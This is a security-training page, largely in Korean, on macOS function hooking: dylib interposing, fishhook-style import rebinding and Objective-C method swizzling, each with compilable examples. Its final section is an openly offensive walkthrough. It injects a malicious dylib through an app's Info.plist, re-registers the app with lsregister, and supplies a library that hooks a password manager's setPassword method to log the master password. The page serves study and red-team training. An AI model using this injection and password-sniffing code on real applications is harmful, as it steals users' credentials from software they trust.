# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

**`__interpose` (`__DATA___interpose`)** 섹션(또는 **`S_INTERPOSING`** 플래그가 지정된 섹션)을 가진 **dylib**를 생성하고, **원본** 함수와 **대체** 함수를 가리키는 **function pointers**의 튜플을 포함한다.

그다음 **`DYLD_INSERT_LIBRARIES`**로 해당 dylib를 **inject** 한다(Interposing은 메인 앱이 로드되기 전에 발생해야 한다). 당연히 **`DYLD_INSERT_LIBRARIES`** 사용에 적용되는 [**restrictions**](macos-library-injection/index.html#check-restrictions)도 여기에도 적용된다.

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> **`DYLD_PRINT_INTERPOSING`** env variable은 interposing을 디버깅하는 데 사용할 수 있으며 interpose process를 출력합니다.

또한 **interposing은 process와 loaded libraries 사이에서 발생**하며, shared library cache에서는 동작하지 않습니다.

### Dynamic Interposing

이제 **`dyld_dynamic_interpose`** function을 사용해 function을 dynamically interpose하는 것도 가능합니다. 이를 통해 **beginning**에서만 하는 대신 **runtime**에 function을 **programmatically** interpose할 수 있습니다.

필요한 것은 **대체할 function과 replacement function의 tuples**를 **지정**하는 것뿐입니다.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
### Import Table Rebinding (fishhook-style)

이미 프로세스 **내부에서** 코드 실행 권한이 있고, 대상을 다시 실행하지 않고 **import된 C function**을 hook하고 싶다면, 매우 흔한 primitive는 **symbol rebinding**입니다(**`fishhook`**가 이를 popularised).

**`__interpose`** section을 사용하는 대신, 이 technique은 Mach-O metadata(`__LINKEDIT` -> indirect symbol table -> `__la_symbol_ptr` / `__nl_symbol_ptr`)를 따라가며 현재 image가 사용하는 **import slot을 overwrite**합니다. 이는 **이미 실행 중인** process에서 function을 hook하거나, **`rebind_symbols_image`**로 **하나의 image만** hook할 때 매우 유용합니다.

> [!TIP]
> 이 방법은 실제로 **import pointer**를 거치는 call에만 영향을 줍니다. target function이 **같은 image 내부에서 직접 호출**되면, rewrite할 imported slot이 없으므로 이 technique은 그 call site를 보지 못합니다.
```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
fprintf(stderr, "[+] close(%d)\n", fd);
return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
struct rebinding rb = {"close", hooked_close, (void *)&real_close};
rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```
최근 macOS 버전에서는 많은 rebinding target이 더 이상 writable **`__DATA`** pages에 있지 않습니다. Rebinder는 보통 pointer를 patch하기 전에 **`__DATA_CONST`**를 잠시 writable로 만들어야 합니다. 또한 Apple Silicon / **`arm64e`**에서는 authenticated pointers와 **`__AUTH_CONST.__auth_got`**의 추가 indirection을 예상해야 하므로, classic lazy/non-lazy symbol pointer sections만 스캔하는 rebinder는 일부 call site를 놓칠 수 있습니다.

> [!CAUTION]
> **`arm64e`** ABI는 많은 function pointer에 대해 **Pointer Authentication (PAC)**을 사용합니다. Intel에서 동작하던 무차별 pointer write는 Apple Silicon에서 call site를 깨뜨릴 수 있습니다. 직접 rebinder나 inline hooker를 작성할 때는 **`<ptrauth.h>`** helper인 **`ptrauth_sign_unauthenticated`** 또는 **`ptrauth_auth_and_resign`**을 사용하고, 특히 **`arm64e`** targets에서 테스트할 준비를 하세요.

**`__AUTH`**, **`__AUTH_CONST`** 그리고 **`__auth_got`**에 대한 자세한 내용은 [this page](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md)를 확인하세요.

## Method Swizzling

ObjectiveC에서 method는 이런 식으로 호출됩니다: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

여기에는 **object**, **method**, 그리고 **params**가 필요합니다. 그리고 method가 호출될 때 **msg is sent**가 **`objc_msgSend`** function을 사용해 수행됩니다: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

object는 **`someObject`**, method는 **`@selector(method1p1:p2:)`**이고, arguments는 **value1**, **value2**입니다.

object structures를 따라가면, **method code**에 대한 **names**와 **pointers**가 **located**된 **methods**의 **array**에 도달할 수 있습니다.

> [!CAUTION]
> methods와 classes는 name을 기반으로 접근되므로, 이 정보는 binary에 저장됩니다. 따라서 `otool -ov </path/bin>` 또는 [`class-dump </path/bin>`](https://github.com/nygard/class-dump)로 이를 추출할 수 있습니다

### Accessing the raw methods

다음 예시처럼 name, params 수, address와 같은 methods 정보를 접근할 수 있습니다:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### method_exchangeImplementations를 사용한 Method Swizzling

함수 **`method_exchangeImplementations`**는 **한 함수의 implementation 주소를 다른 함수의 것과 서로 바꾸도록** **변경**할 수 있게 해줍니다.

> [!CAUTION]
> 따라서 어떤 함수가 호출되면 **실제로 실행되는 것은 다른 함수**입니다.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really called

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> 이 경우 **legit** 메서드의 **implementation code**가 **method** **name**을 **verifies**하면 이 swizzling을 **detect**하고 실행을 막을 수 있습니다.
>
> 다음 technique은 이 제약이 없습니다.

### Method Swizzling with method_setImplementation

이전 형식은 좀 이상한데, 두 개의 method의 implementation을 서로 바꾸고 있기 때문입니다. **`method_setImplementation`** 함수를 사용하면 한 **method**의 **implementation**을 다른 method의 것으로 **change**할 수 있습니다.

나중에 새 implementation에서 호출할 예정이라면, 덮어쓰기 전에 반드시 **원래 것의 implementation 주소를 저장**해 두세요. 나중에는 그 주소를 찾기가 훨씬 더 복잡해지기 때문입니다.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Hooking Attack Methodology

이 페이지에서는 functions를 hook하는 다양한 방법을 다뤘습니다. 그러나 이들은 모두 **attack하기 위해 process 내부에서 code를 실행**하는 방식이었습니다.

이를 위해 가장 쉽게 사용할 수 있는 technique은 [Dyld via environment variables or hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md)를 inject하는 것입니다. 하지만 이것도 [Dylib process injection](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port)을 통해서도 가능하다고 생각합니다.

하지만 두 옵션 모두 **unprotected** binaries/processes에만 **limited**되어 있습니다. 각 technique의 limitations를 더 알아보려면 각각을 확인하세요.

그러나 function hooking attack은 매우 구체적입니다. attacker는 이를 통해 process 내부에서 **sensitive information을 steal**하려고 합니다(그렇지 않다면 그냥 process injection attack을 하면 됩니다). 그리고 이 sensitive information은 MacPass 같은 user downloaded Apps에 위치할 수도 있습니다.

따라서 attacker vector는 application의 vulnerability를 찾거나 signature를 제거한 뒤, Info.plist를 통해 **`DYLD_INSERT_LIBRARIES`** env variable을 inject하여 다음과 같은 것을 추가하는 것입니다:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
그런 다음 애플리케이션을 **다시 등록**하세요:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
그 라이브러리에 hooking code를 추가하여 정보를 exfiltrate하세요: Passwords, messages...

> [!CAUTION]
> 최신 버전의 macOS에서는 애플리케이션 binary의 signature를 **strip**하고, 해당 binary가 이전에 실행된 적이 있다면, macOS는 더 이상 그 애플리케이션을 **실행하지 않을 것**입니다.

#### Library example
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## References

- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)
- [https://github.com/facebook/fishhook](https://github.com/facebook/fishhook)
- [https://clang.llvm.org/docs/PointerAuthentication.html](https://clang.llvm.org/docs/PointerAuthentication.html)

{{#include ../../../banners/hacktricks-training.md}}
